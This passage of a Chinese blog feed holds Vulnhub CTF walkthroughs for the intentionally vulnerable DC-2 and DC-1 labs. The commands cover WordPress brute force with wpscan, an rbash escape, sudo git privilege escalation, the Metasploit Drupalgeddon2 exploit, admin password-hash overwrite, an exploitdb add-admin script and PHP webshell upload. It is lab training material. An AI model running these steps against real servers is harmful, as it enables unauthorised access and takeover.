class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -v -sC -sV -p- -oN 2158.log 192.168.21.58</span><br><span class="line"># 目标开启了 80端口和7744端口, 访问80端口发现无法打开网站</span><br><span class="line"># 将ip地址添加到host文件中做个映射关系</span><br><span class="line">vim /etc/hosts</span><br><span class="line">192.168.21.58dc-2</span><br><span class="line"></span><br><span class="line"># windows系统host文件位置</span><br><span class="line">C:\Windows\System32\drivers\etc\</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071936141.png" alt="image-20220307192256648"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071936956.png" alt="image-20220307153453391"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 成功打开网站, 且发现是wordpress搭建的.</span><br><span class="line"># flag提示使用密码生成工具 cewl</span><br><span class="line"># 使用cewl 生成一个密码字典</span><br><span class="line">cewl http://dc-2 &gt; dc-2.txt </span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071936101.png" alt="image-20220307152923920"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071936038.png" alt="image-20220307153614567"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071936468.png" alt="image-20220307164544611"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 使用wpscan可以扫出wordpress有哪些漏洞</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071936572.png" alt="image-20220307164949283"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071936787.png" alt="image-20220307165008717"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071936612.png" alt="image-20220307165046923"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用wpscan枚举出当前存在的用户, 并存入username.txt文件中</span><br><span class="line">wpscan --url http://dc-2/ -e u &gt; username.txt</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937339.png" alt="image-20220307165337377"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 利用刚刚cewl生成的密码字典进行爆破</span><br><span class="line">wpscan ‐‐url http://dc‐2/ ‐U username.txt ‐P dc-2.txt </span><br><span class="line"></span><br><span class="line">jerry: adipiscing</span><br><span class="line">tom: parturient</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937313.png" alt="image-20220307170706923"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wordpress的后台一般是wp-admin, 尝试登录jerry和tom帐号</span><br><span class="line">http://dc-2/wp-admin</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937743.png" alt="image-20220307171311036"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937194.png" alt="image-20220307171357176"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937575.png" alt="image-20220307171406660"></p><h3 id="3-连接ssh登录"><a href="#3-连接ssh登录" class="headerlink" title="3. 连接ssh登录"></a>3. 连接ssh登录</h3><h4 id="使用tom用户连接ssh"><a href="#使用tom用户连接ssh" class="headerlink" title="使用tom用户连接ssh"></a>使用tom用户连接ssh</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 尝试登录第二个帐号看看, emmmmm........好像什么都没有, 试试ssh连接7744端口看看</span><br><span class="line">ssh -p 7744 tom@192.168.21.58</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937188.png" alt="image-20220307174007278"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查看 tom 用户有什么权限</span><br><span class="line">echo $PATH</span><br><span class="line">echo /home/tom/usr/bin/*</span><br><span class="line"># 只能执行 less,ls,scp,vi 这4个命令</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937727.png" alt="image-20220307174820405"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vi falg3.txt</span><br><span class="line"></span><br><span class="line"># Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes</span><br><span class="line"></span><br><span class="line"># 可怜的老汤姆总是追着杰瑞跑. 也许他应该为他造成的所有压力而起诉.</span><br><span class="line"></span><br><span class="line"># emmmm.....这个翻译.....但是看着应该和jerry, tom有些关系. 试试用jerry连接ssh试试</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937405.png" alt="image-20220307174628796"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937021.png" alt="image-20220307174915624"></p><h4 id="切换到jerry用户-但是无法使用su-命令-需要绕过bash"><a href="#切换到jerry用户-但是无法使用su-命令-需要绕过bash" class="headerlink" title="切换到jerry用户, 但是无法使用su 命令, 需要绕过bash"></a>切换到jerry用户, 但是无法使用su 命令, 需要绕过bash</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">pwd</span><br><span class="line">/bin/bash</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br><span class="line">su jerry</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937036.png" alt="image-20220307175756365"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 切换到jerry的家目录查看</span><br><span class="line">cd /home/jerry</span><br><span class="line">ls</span><br><span class="line">cat falg4.txt</span><br><span class="line"></span><br><span class="line">Good to see that you've made it this far - but you're not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you're on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071937644.png" alt="image-20220307180021808"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071938234.png" alt="image-20220307180116820"></p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 尝试 dc-1中 find 提权, 并没有find</span><br><span class="line">find / -perm -y=s -type f 2&gt;/dev/null</span><br><span class="line"># 看看jerry有没有可以执行的具有root权限的命令</span><br><span class="line">sudo -l</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071938826.png" alt="image-20220307191028749"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071938319.png" alt="image-20220307191238514"></p><h4 id="在网上查一下git提权的方法"><a href="#在网上查一下git提权的方法" class="headerlink" title="在网上查一下git提权的方法"></a>在网上查一下<a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#3git%E6%8F%90%E6%9D%83">git提权的方法</a></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></tbody></table></figure><p><img src="E:/img/image-20220307191629821.png" alt="image-20220307191629821"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071938599.png" alt="image-20220307191650857"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 进入 root 目录查看</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it's all greatly</span><br><span class="line">appreciated.</span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071938410.png" alt="image-20220307191751839"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203071938577.png" alt="image-20220307191824493"></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub靶机 </tag>
            
            <tag> 注入 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机_DC-1</title>
      <link href="/2022/03/01/Vulnhub%E9%9D%B6%E6%9C%BA_DC-1/"/>
      <url>/2022/03/01/Vulnhub%E9%9D%B6%E6%9C%BA_DC-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnhub靶机-DC-1"><a href="#Vulnhub靶机-DC-1" class="headerlink" title="Vulnhub靶机_DC-1"></a>Vulnhub靶机_DC-1</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Vulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag.</p><p><strong>靶机下载地址：</strong><a href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p><p>DC-1 是一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。共有五个flag，但最终目标是拿到root目录中的flag</p><p><strong>涉及漏洞：</strong><a href="http://vulhub.org.cn/vuln/VH-CVE-2018-7600">CVE-2018-7600</a> <a href="http://vulhub.org.cn/vuln/VH-CVE-2018-7600">CVE-2018-7600</a></p><p><strong>参考：</strong><a href="https://www.anquanke.com/post/id/104697">CVE-2018-7600 Drupal核心远程代码执行漏洞分析</a> <a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">Uncovering Drupalgeddon 2</a></p><p><strong>攻击机：</strong>Kali/192.168.22.46</p><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><p>运行部署好的虚拟机，提示需要账号密码，该靶机不提供密码需要自己去渗透提权</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272005155.png" alt="image-20220227200520341"></p><p><strong>因不知道DC-1靶机的IP，所有我们需要将靶机和攻击机kali放在同一个局域网里面，将Kali的网络适配器使用<code>桥接模式</code></strong></p><h4 id="1-探测目标"><a href="#1-探测目标" class="headerlink" title="1.探测目标"></a>1.探测目标</h4><p><strong>使用arp-scan工具</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 探测同一区域中存活主机</span><br><span class="line">arp-scan -l# -l 表示使用网络接口</span><br><span class="line"></span><br><span class="line"># 也可以使用 netdiscover 工具探测存活的主机</span><br><span class="line">netdiscover -i eth0# -i device 用于嗅探和注入数据包的网络接口</span><br><span class="line"></span><br><span class="line"># 两个工具, arp-scan 速度更快一些</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272119051.png" alt="image-20220227211906644"></p><h4 id="2-查看目标开放端口"><a href="#2-查看目标开放端口" class="headerlink" title="2.查看目标开放端口"></a>2.查看目标开放端口</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"># 使用 nmap 扫描目标ip</span><br><span class="line">nmap -v -sV -sC -T4 -p- -oN map.log 192.168.22.23</span><br><span class="line"># -v 输出详细信息</span><br><span class="line"># -sV 扫描目标主机和端口上运行的软件的版本</span><br><span class="line"># -sC 根据端口识别的服务,调用默认脚本</span><br><span class="line"># -T4 扫描时, TCP每4秒发一次包</span><br><span class="line"># -p- 全端口扫描</span><br><span class="line"># -oN 将扫描结果输出到 map.log 文件中</span><br><span class="line"></span><br><span class="line"># map.log</span><br><span class="line"># Nmap 7.92 scan initiated Sun Feb 27 15:48:10 2022 as: nmap -T4 -v -sC -sV -p- -oN map.log 192.168.22.23</span><br><span class="line">Nmap scan report for 192.168.22.23</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          35518/udp6  status</span><br><span class="line">|   100024  1          42538/udp   status</span><br><span class="line">|   100024  1          47921/tcp6  status</span><br><span class="line">|_  100024  1          56753/tcp   status</span><br><span class="line">56753/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:4E:A6:04 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sun Feb 27 15:48:37 2022 -- 1 IP address (1 host up) scanned in 27.82 seconds</span><br></pre></td></tr></tbody></table></figure><p>可以看见, 目标主机开了80端口, 服务器是 apache 2.2.22 版本, 系统是 Debian</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272130384.png" alt="image-20220227213011471"></p><h4 id="3-查看网页相关信息"><a href="#3-查看网页相关信息" class="headerlink" title="3.查看网页相关信息"></a>3.查看网页相关信息</h4><p>访问目标ip看看, <a href="http://192.168.22.23/">http://192.168.22.23:80</a></p><p>使用浏览器插件<code>Wappalyzer</code>，这个插件可以检测网站的CMS，框架，服务器等信息，可以看到该网站使用CMS为<code>Drupal</code>，在网页界面和底部都能发现是Drupal</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272133646.png" alt="image-20220227213313742"></p><h3 id="二、漏洞查找与利用"><a href="#二、漏洞查找与利用" class="headerlink" title="二、漏洞查找与利用"></a>二、漏洞查找与利用</h3><h4 id="漏洞查找"><a href="#漏洞查找" class="headerlink" title="漏洞查找"></a>漏洞查找</h4><p>使用Metasploit搜索Drupal</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 初始化 msfdb 并启动 msfconsole</span><br><span class="line">msfdb init &amp;&amp; msfconsole</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272137818.png" alt="image-20220227213754162"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 搜索 Drupal 的漏洞</span><br><span class="line">search Drupal</span><br><span class="line"># 出现 Metasploit tip: View missing module options with show missing 表示成功启动.</span><br><span class="line"># 漏洞利用, 优先选择上面查到模块的Rank为excellent并且时间较新的模块，这里我使用的是第2个.</span><br><span class="line">$ use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">$ show options</span><br><span class="line">$ set RHOSTS 192.168.22.23</span><br><span class="line">$ exploit 或者 run</span><br></pre></td></tr></tbody></table></figure><p><img src="E:/img/image-20220227214006912.png" alt="image-20220227214006912"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272146982.png" alt="image-20220227214535116"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 这里看见第一个flag, 使用 cat 命令看一下</span><br><span class="line">$ cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so du you</span><br><span class="line"># 翻译：每一个好的CMS都需要一个配置文件，你也一样.</span><br><span class="line"># 百度搜索 Drupal 的默认配置文件为 /var/www/sites/default/settings.php</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272150216.png" alt="image-20220227214826782"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272152514.png" alt="image-20220227215215479"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># cat 查看配置文件</span><br><span class="line">$ cat /var/www/sites/default/settings.php</span><br><span class="line"># 新开一个终端窗口准备连接数据库</span><br></pre></td></tr></tbody></table></figure><p><a href="https://www.iteye.com/blog/justcoding-1407697">Drupal7的目录结构及术语</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272156285.png" alt="image-20220227215640849"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在配置文件中看到第二个flag</span><br><span class="line">Brute force and dictionary attacks aren't the only ways to gain access (and you WILL need access). What can you do with these credentials?</span><br><span class="line">翻译: 蛮力和字典攻击并不是获得访问权的唯一方法（而且你将需要访问权）。你能用这些凭证做什么？</span><br><span class="line"># 还看见了数据库的帐号密码</span><br><span class="line">'username' =&gt; 'dbuser',</span><br><span class="line">'password' =&gt; 'R0ck3t',</span><br></pre></td></tr></tbody></table></figure><h4 id="三-获取交互式shell"><a href="#三-获取交互式shell" class="headerlink" title="三. 获取交互式shell"></a>三. 获取交互式shell</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 使用python反弹一个交互式shell，然后登陆数据库</span><br><span class="line">$ python -c 'import pty; pty.spawn("/bin/bash")'</span><br><span class="line"></span><br><span class="line">$ mysql -u dbuser -p</span><br><span class="line">Enter password:R0ck3t</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272204062.png" alt="image-20220227220419777"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 选择 drupaldb 数据库</span><br><span class="line">$ use drupaldb;</span><br><span class="line"># 查看 drupaldb 数据库的表</span><br><span class="line">$ show tables;</span><br><span class="line"># 发现有一个 users 表, 查看表中内容</span><br><span class="line">$ select * from users;</span><br><span class="line"># 发现了帐号和密码, 但是密码经过了 hash的加密</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272206465.png" alt="image-20220227220646909"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272207647.png" alt="image-20220227220750388"></p><p>修改admin用户的密码</p><p>参考：<a href="http://drupalchina.cn/node/2128">忘记Drupal的管理员密码的解决办法</a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 先退出数据库, 然后使用Drupal对数据库的加密方法，生成一个新密码，然后把新的密码更新到admin用户.</span><br><span class="line">加密脚本位置在/var/www/scripts/password-hash.sh下</span><br><span class="line">$ exit;</span><br><span class="line">$ php scripts/password-hash.sh 1234</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272214973.png" alt="image-20220227221428316"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 重新连接数据库</span><br><span class="line">$ mysql -u dbuser -p</span><br><span class="line">Enter password:R0ck3t</span><br><span class="line"># 更新 admin 的密码</span><br><span class="line">$ update drupaldb.users set pass="$S$Dx/rebqAPRM7ear2cM69DQkpypHGqYS5YLUz02kSABUqECoyVJg9" where name="admin";</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272219107.png" alt="image-20220227221855105"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 第二种方法还可以新增一个admin权限的用户, 在exploitdb中有一个针对Drupal 7版本的攻击脚本，可以增加一个admin权限的用户账号</span><br><span class="line"># 查看Drupal版本,确定Drupal版本为7.24</span><br><span class="line">$ cat /var/www/includes/bootstrap.inc | grep VERSION</span><br><span class="line"># 搜索攻击脚本并选择适合当前 Drupal 版本的脚本</span><br><span class="line">$ searchsploit drupal</span><br><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.22.23 -u admin1 -p admin1</span><br></pre></td></tr></tbody></table></figure><h4 id="第二种方法获取-shell"><a href="#第二种方法获取-shell" class="headerlink" title="第二种方法获取 shell"></a>第二种方法获取 shell</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 使用 meterpreter 工具上传一句话马, 回到之前查看到数据库帐号密码的窗口, 使用命令 exit; 退出.</span><br><span class="line">$ exit;</span><br><span class="line">$ exit</span><br><span class="line"># 进入 meterpreter 工具交互窗口</span><br><span class="line">$ set RHOSTS 192.168.22.23</span><br><span class="line"># 在本机 kali 上 新建一个一句话马文件</span><br><span class="line">vim shell.php</span><br><span class="line"># 上传到目标服务器</span><br><span class="line">$ upload /root/Desktop/shell.php /var/www/shell.php</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272257606.png" alt="image-20220227225729483"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272303567.png" alt="image-20220227230129512"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272303194.png" alt="image-20220227230341638"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查看是否上传成功</span><br><span class="line">$ ls /var/www/</span><br><span class="line"># 蚁剑连接</span><br><span class="line">http://192.168.22.23/shell.php</span><br></pre></td></tr></tbody></table></figure><p><img src="E:/img/image-20220227230556370.png" alt="image-20220227230556370"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272308988.png" alt="image-20220227230745848"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272308721.png" alt="image-20220227230830455"></p><h4 id="输入用户名-密码【admin-1234或者admin1-admin1】，尝试登陆"><a href="#输入用户名-密码【admin-1234或者admin1-admin1】，尝试登陆" class="headerlink" title="输入用户名/密码【admin/1234或者admin1/admin1】，尝试登陆"></a>输入用户名/密码【admin/1234或者admin1/admin1】，尝试登陆</h4><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272224895.png" alt="image-20220227222417841"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 成功登陆,并在后台左上角的Find content中发现flag3</span><br><span class="line">Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.</span><br><span class="line">翻译: 特殊的PERMS将有助于找到passwd--但你需要--执行该命令以找出如何获得阴影中的内容。</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272225755.png" alt="image-20220227222458249"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272226189.png" alt="image-20220227222627028"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># flag3的信息中提到了passwd和shadow,很明显就是/etc/passwd和/etc/shadow 还提到了find、perms、-exec，这几个是提权用的. </span><br><span class="line"># cat查看/etc/passwd和/etc/shadow 的内容</span><br><span class="line">$ cat /etc/passwd</span><br><span class="line"># 只查看末尾 3 行的内容</span><br><span class="line">$ tail -3 /etc/passwd</span><br><span class="line"># 没有权限查看/etc/shadow 的内容</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272230339.png" alt="image-20220227223009368"></p><p><img 